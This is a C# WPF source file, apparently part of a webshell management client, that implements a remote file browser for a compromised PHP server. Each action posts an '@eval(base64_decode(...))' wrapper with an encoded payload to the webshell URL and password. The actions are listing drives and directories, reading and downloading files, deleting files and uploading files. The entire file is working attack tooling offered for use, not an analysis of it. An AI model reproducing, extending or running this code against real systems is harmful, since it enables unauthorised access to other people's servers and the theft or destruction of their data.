using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using WpfApp1.Payload.php;
using WpfApp1.Utli;



namespace WpfApp1.UI 
{
    /// <summary>
    /// FileList.xaml 的交互逻辑
    /// </summary>
    public partial class FileList : Window
    {


        Post post = new Post(); //引用post 请求类

        /// <summary>
        /// 引入payload
        /// </summary>
        Controller payload = new Controller();

        /// <summary>
        /// Base64加密
        /// </summary>
        encrypt encrypt = new encrypt();

        public static ObservableCollection<FileListData> FileListData = new ObservableCollection<FileListData>(); //及时更新

        /// <summary>
        /// url链接
        /// </summary>
        public string getUrl { get; set; }

        /// <summary>
        /// 密码
        /// </summary>
        public string getPwd { get; set; }
        /// <summary>
        /// 
        /// </summary>
        public string Script { get; set; }


        public FileList()
        {
            InitializeComponent();
            ListView.ItemsSource = FileListData;



        }

        /// <summary>
        /// url链接
        /// </summary>
        public string shell = string.Empty;

        /// <summary>
        /// 密码
        /// </summary>
        public string pwd = string.Empty;

        public string Paths = string.Empty;


        string filePath = string.Empty;  //路径
        /// <summary>
        /// 获取盘符
        /// </summary>
        public void pan()
        {
            string pay = payload.Pan();
            string z1 = "@eval(base64_decode($_POST['z1']));";

            string z2 = z1 + "&z1=" + pay;
            shell = getUrl;

            pwd = getPwd;

            string rsults = Post.Postring(shell, new Dictionary<string, string> { { pwd, z2 } });
            rsults = rsults.Trim(); ;
            string[] p = rsults.Split(':');
   

            foreach (string s in p)
            {
                if (s == "")
                {
                    return;
                }
                var pNode = new TreeViewItem()
                {
                    // Set the header
                    Header = "本地磁盘(" + s + ":)",
                    // And the full path
                    Tag = s + ":/",

                };
                pNode.Items.Add(null);
                FolderView.Items.Add(pNode);
                pNode.Expanded += Folder_Expanded;
            }


        }




        private void Folder_Expanded(object sender, RoutedEventArgs e)
        {
            var item = (TreeViewItem)sender;


            // If the item only contains the dummy data
            if (item.Items.Count != 1 || item.Items[0] != null)
                return;

            // Clear dummy data
            item.Items.Clear();
            FileListData.Clear();
            // Get full path
            var fullPath = (string)item.Tag;

            Paths = fullPath;

            textPath.Text = Paths;
            // Create a blank list for directories
            var directories = new List<string>();

            string D = String.Format("$D=\"{0}\";", fullPath);

            try
            {
                string dirs = payload.Files();
                string z1 = encrypt.EncodeBase64("utf-8", fullPath);
                string outs = dirs + "&p=" + z1;
                string results = Post.Postring(shell, new Dictionary<string, string> { { pwd, outs }, });

                //解析 json 数据
                JArray lstRole = (JArray)JsonConvert.DeserializeObject(results);
                if (lstRole== null )
                {
                    System.Environment.Exit(0);
                }

                foreach (var s in lstRole)
                {
                    JObject txt = JObject.Parse(s.ToString());//解析json数据
                    string Path = System.Web.HttpUtility.UrlDecode(txt["path"].ToString());
                    string time = txt["time"].ToString();
                    string size = HumanReadableFileSizee(Convert.ToDouble(txt["size"].ToString()));
                    string root = txt["root"].ToString();

                    FileListData.Add(new FileListData { path = Path, time = time, size = size, attribute = root });

                    //添加目录到数组中
                    if (Path.Length > 0)
                        directories.Add(Path);
                }

                directories.ForEach(directoryText =>
                {
                    if (directoryText.Contains("/") == true)
                    {
                        var subItem = new TreeViewItem()
                        {
                            // Set header as folder name
                            Header = directoryText,
                            // And tag as full path
                            Tag = fullPath + directoryText
                        };

                        // Add dummy item so we can expand folder
                        subItem.Items.Add(null);

                        // Handle expanding
                        subItem.Expanded += Folder_Expanded;

                        // Add this item to the parent
                        item.Items.Add(subItem);
                    }
                });

            }
            catch {
                
            }

        }
    
 

        /// <summary>
        /// 字节转换 方法
        /// </summary>
        /// <param name="size"></param>
        /// <returns></returns>
        public String HumanReadableFileSizee(double size)
        {
            String[] units = new String[] { "B" ,"KB","MB","GB"};
            double mode = 1024.0;
            int i = 0;
            while (size >= mode)
            {
                size /= mode;
                i++;
            }
            return Math.Round(size) + units[i];
        }
       

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
//textPath.Text = Wroot();
            string filePath = Wroot();
            if (filePath.Contains(":/"))
            {
                //MessageBox.Show(Wroots);
                filePath.Replace("/", "\\");
                textPath.Text = filePath;
                pan();


            }else if (filePath.Contains("/"))
            {
                LinuxPath(filePath);
            }

             textPath.Text = filePath;
             
            

            try
            {
                FileListData.Clear();
                string D = String.Format("$D=\"{0}\";", textPath.Text);
                string dirs = payload.Files();
                string z1 = encrypt.EncodeBase64("utf-8", textPath.Text);
                string outs = dirs + "&p=" + z1;
                string results = Post.Postring(shell, new Dictionary<string, string> { { pwd, outs }, });

                if (results == "webshell连接超时")
                {
                   
                    this.Close();
                    MessageBox.Show("链接超时或者网络原因！");
                }

                else
                {
                    //解析 json 数据
                    JArray lstRole = (JArray)JsonConvert.DeserializeObject(results);

                    foreach (var s in lstRole)
                    {
                        JObject txt = JObject.Parse(s.ToString());//解析json数据
                        string Path = System.Web.HttpUtility.UrlDecode(txt["path"].ToString());
                        string time = txt["time"].ToString();
                        string size = HumanReadableFileSizee(Convert.ToDouble(txt["size"].ToString()));
                        string root = txt["root"].ToString();

                        FileListData.Add(new FileListData { path = Path, time = time, size = size, attribute = root });
                    }
                } 
               
            }
            catch
            {
                //MessageBox.Show("ERROR:// Path Not Found Or No Permission!");
                this.Close();
            }


        }

        //linux 文件
        public void LinuxPath(string filePath)
        {
            
            var LinuxNode = new TreeViewItem()
            {
                // Set the header
                Header = "/",
                // And the full path
                Tag = "/",

            };
            LinuxNode.Items.Add(null);
            FolderView.Items.Add(LinuxNode);
            LinuxNode.Expanded += LinuxNode_Expanded;
        }
        
        private void LinuxNode_Expanded(object sender, RoutedEventArgs e)
        {
            var item = (TreeViewItem)sender;


            // If the item only contains the dummy data
            if (item.Items.Count != 1 || item.Items[0] != null)
                return;

            // Clear dummy data
            item.Items.Clear();
            FileListData.Clear();
            // Get full path
            var fullPath = (string)item.Tag;

            Paths = fullPath;

            textPath.Text = Paths;
            // Create a blank list for directories
            var directories = new List<string>();

            string D = String.Format("$D=\"{0}\";", fullPath);

            try
            {
                string dirs = payload.Files();
                string z1 = encrypt.EncodeBase64("utf-8", fullPath);
                string outs = dirs + "&p=" + z1;
                string results = Post.Postring(shell, new Dictionary<string, string> { { pwd, outs }, });

                //解析 json 数据
                JArray lstRole = (JArray)JsonConvert.DeserializeObject(results);

                foreach (var s in lstRole)
                {
                    JObject txt = JObject.Parse(s.ToString());//解析json数据
                    string Path = System.Web.HttpUtility.UrlDecode(txt["path"].ToString());
                    string time = txt["time"].ToString();
                    string size = HumanReadableFileSizee(Convert.ToDouble(txt["size"].ToString()));
                    string root = txt["root"].ToString();

                    FileListData.Add(new FileListData { path = Path, time = time, size = size, attribute = root });

                    //添加目录到数组中
                    if (Path.Length > 0)
                        directories.Add(Path);
                }

                directories.ForEach(directoryText =>
                {
                    if (directoryText.Contains("/") == true)
                    {
                        var subItem = new TreeViewItem()
                        {
                            // Set header as folder name
                            Header = directoryText,
                            // And tag as full path
                            Tag = fullPath + directoryText
                        };

                        // Add dummy item so we can expand folder
                        subItem.Items.Add(null);

                        // Handle expanding
                        subItem.Expanded += Folder_Expanded;

                        // Add this item to the parent
                        item.Items.Add(subItem);
                    }
                });

            }
            catch
            {

            }
        }


        /// <summary>
        /// 读取按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                FileListData.Clear();
                string D = String.Format("$D=\"{0}\";", textPath.Text);
                string dirs = payload.Files();
                string z1 = encrypt.EncodeBase64("utf-8", textPath.Text);
                string outs = dirs + "&p=" + z1;
                string results = Post.Postring(shell, new Dictionary<string, string> { { pwd, outs }, });

                //解析 json 数据
                JArray lstRole = (JArray)JsonConvert.DeserializeObject(results);

                foreach (var s in lstRole)
                {
                    JObject txt = JObject.Parse(s.ToString());//解析json数据
                    string Path = System.Web.HttpUtility.UrlDecode(txt["path"].ToString());
                    string time = txt["time"].ToString();
                    string size = HumanReadableFileSizee(Convert.ToDouble(txt["size"].ToString()));
                    string root = txt["root"].ToString();

                    FileListData.Add(new FileListData { path = Path, time = time, size = size, attribute = root });
                }
            }
            catch
            {
                MessageBox.Show("ERROR:// Path Not Found Or No Permission!");
            }
            

            
            }


        /// <summary>
        /// 获取webshell当前目录
        /// </summary>
        /// <returns></returns>
        public string Wroot()
        {
           
            shell = getUrl;
            pwd = getPwd;
            string filePath=string.Empty;
            //获取webshell当前目录
            string Wroot = payload.Wroot();
            string z1 = "@eval(base64_decode($_POST['z1']));";
            string c = z1 + "&z1=" + Wroot;
            string Wroots = Post.Postring(shell, new Dictionary<string, string> { { pwd, c } });
           

            return Wroots;

        }
        /// <summary>
        /// 点击事件 TreeView
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void TextBlock_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            return;
        }
        /// <summary>
        /// ListView 右键点击 选中 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ListView_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (ListView.SelectedItem != null)
            {
                Viewfile.IsEnabled = true;
                Deletefile.IsEnabled = true;
                Dowfile.IsEnabled = true;
            }
            else
            {
                
                Viewfile.IsEnabled = false;
                Deletefile.IsEnabled = false;
                Dowfile.IsEnabled = false;
            }

            
        }
       
       
        /// <summary>
        /// listview 右键点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Viewfile_Click(object sender, RoutedEventArgs e)
        {
            FileListData listData = ListView.SelectedItem as FileListData;
            if (listData != null && listData is FileListData)
            {
                
                if (listData.path.Contains("/")==true)
                {

                    return;
                }
                else
                {
                    string path = textPath.Text +"/"+ listData.path;
                    ViewFile viewFile = new ViewFile();
                    viewFile.getPath = path;
                    viewFile.getUrl = shell;
                    viewFile.getPwd = pwd;
                    viewFile.getScript = Script;
                    viewFile.Show();
                    //MessageBox.Show(listData.path);
                }

            }
        }
        /// <summary>
        /// 删除文件 点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Deletefile_Click(object sender, RoutedEventArgs e)
        {

            FileListData listData = ListView.SelectedItem as FileListData;
            if (listData != null && listData is FileListData)
            {
                if (listData.path.Contains("/") == true)
                {

                    MessageBox.Show(listData.path);
                }
                else
                {
                    string messageBoxText = String.Format("确定删除文件{0}吗?", listData.path);
                    MessageBoxResult result = MessageBox.Show(messageBoxText, "删除文件", MessageBoxButton.YesNo, MessageBoxImage.Error);
                    if (result == MessageBoxResult.Yes)
                    {
                        string path = textPath.Text + "/" + listData.path;
                        string z1 = "@eval(base64_decode($_POST['z1']));";
                        string p = z1 + "&z1=" + payload.DelFile() + "&file=" + encrypt.EncodeBase64("utf-8", path);

                        string results = Post.Postring(shell, new Dictionary<string, string> { { pwd, p } });


                        if (results == "1")
                        {
                            MessageBox.Show("Success");

                        }
                        else
                        {
                            MessageBox.Show("Failed");
                        }
                    }
                    

                }
            }
        }

        /// <summary>
        /// 新建文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Createfile_Click(object sender, RoutedEventArgs e)
        {
            FileListData listData = ListView.SelectedItem as FileListData;
            if (listData != null && listData is FileListData)
            {
                if (listData.path.Contains("/") == true)
                {

                    MessageBox.Show(listData.path);
                }
                else
                {
                    Createfile Create = new Createfile();
                    Create.getPwd = pwd;
                    Create.getUrl = shell;
                    Create.getPath = textPath.Text;
                    Create.getScript = Script;
                    Create.Show();
                }
            }
           
        }
        /// <summary>
        /// 上传文件 点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void UploadFiles_Click(object sender, RoutedEventArgs e)
        {

            string z1 = "@eval(base64_decode($_POST['z1']));";
            

            string FileOut = string.Empty;
            var openFileDialog = new Microsoft.Win32.OpenFileDialog()
            {
                Filter = "Excel Files (*.)|*.txt"
            };
            var result = openFileDialog.ShowDialog();
            if(result == true)
            {
                //获取文件路径
                var FileNmae = openFileDialog.FileName;
                //读取文件
                using(StreamReader sr = new StreamReader(FileNmae, Encoding.Default))
                {
                    FileOut = sr.ReadLine();
                   
                }
               
                int index = FileNmae.LastIndexOf("\\"); //分隔符
                string fileName = FileNmae.Substring(index + 1, FileNmae.Length - index - 1); //获取文件名
                string path = textPath.Text + "\\"+ fileName; //组合文件名目录


                
                string BasePath = encrypt.EncodeBase64("utf-8", path);
                string content = encrypt.EncodeBase64("utf-8", FileOut);

                string p = z1 + "&z1=" + payload.WriteFile() + "&file=" + BasePath + "&content=" + content;

                string results = Post.Postring(shell, new Dictionary<string, string> { { pwd, p } });


                if (results == "1")
                {
                    MessageBox.Show("文件上传成功！");
                }
                else
                {
                    MessageBox.Show("文件上传失败！");
                }

            }
        }
        /// <summary>
        /// 下载文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Dowfile_Click(object sender, RoutedEventArgs e)
        {

            string z1 = "@eval(base64_decode($_POST['z1']));";
            string TextOut = string.Empty;

            var SaveFileDialog = new Microsoft.Win32.SaveFileDialog()
            {
                Filter = "Excel Files (*.)|*.txt"
            };
            var result = SaveFileDialog.ShowDialog();
            if (result == true)
            {
                //获取文件路径
                var FileNmae = SaveFileDialog.FileName;
                int index = FileNmae.LastIndexOf("\\"); //分隔符
                string fileOpenPath = FileNmae.Substring(0, index); //目录

                
                FileListData listData = ListView.SelectedItem as FileListData;
                if (listData != null && listData is FileListData)
                {
                    if (listData.path.Contains("/") == true)
                    {

                        MessageBox.Show(listData.path);
                    }
                    else
                    {
                        string path = textPath.Text + "/" + listData.path;
                        string BasePath = encrypt.EncodeBase64("utf-8", path);
                        string p = z1 + "&z1=" + payload.ViewFile() + "&path=" + BasePath;
                        TextOut = Post.Postring(shell, new Dictionary<string, string> { { pwd, p } });
                        MessageBox.Show("文件下载成功！");
                    }
                }
                try
                {
                    StreamWriter wr = File.CreateText(FileNmae);
                    wr.Write(TextOut);
                    wr.Flush();
                    wr.Close();
                }
                catch
                {
                    MessageBox.Show("文件保存异常！");
                }
                



            }

        }

        //listview 左键点击
        private void ListView_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            return;
        }
       




    }

   
}
